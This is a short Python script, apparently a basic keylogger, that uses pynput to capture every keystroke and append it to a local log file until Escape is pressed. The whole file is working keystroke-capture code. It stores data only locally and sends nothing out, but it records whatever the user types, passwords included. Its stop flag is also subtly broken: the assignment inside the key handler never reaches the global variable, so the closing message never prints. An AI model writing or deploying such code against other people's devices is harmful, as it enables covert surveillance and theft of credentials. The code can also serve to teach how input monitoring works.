from pynput.keyboard import Key, Listener

stop_logging = False

# Function to write the pressed key into the log file
def on_press(key):
    try:
        # Open the log file in append mode
        with open("keylogger/keylog.txt", "a") as f:
            f.write(str(key.char) + '\n')
    except AttributeError:
        # If a special key (like Shift, Ctrl, etc.) is pressed
        with open("keylogger/keylog.txt", "a") as f:
            f.write(str(key) + '\n')

    if key == Key.esc:
        stop_logging = True

# Function to stop the keylogger
def on_release(key):
    if key == Key.esc:  # If the Escape key is pressed
        return False     # Stop the keylogger

# Start listening to the keyboard
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

if stop_logging:
    print("Keylogger stopped.")
